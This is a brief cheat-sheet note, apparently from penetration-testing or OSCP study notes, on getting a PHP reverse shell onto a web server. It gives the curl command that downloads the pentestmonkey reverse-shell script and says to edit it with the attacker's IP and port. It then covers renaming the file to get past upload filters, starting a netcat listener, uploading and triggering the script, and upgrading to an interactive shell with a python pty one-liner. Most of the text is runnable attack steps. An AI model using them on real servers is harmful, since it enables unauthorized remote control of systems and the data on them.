# PHP reverse shell

First, download the script:

    curl -LO https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

Change `ip` and `port` in the script (use `ip addr` for ip, `port` can be anything that's available):

    nano php-reverse-shell.php

Also probably rename, see [Bypass File Upload Filtering](https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html).

Next, start `nc`:

    nc -lvnp <port>

Finally, upload the script to the server, and open the newly created link.

To upgrade the dumb shell:

    python -c 'import pty; pty.spawn("/bin/bash")'

For even more, see [Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)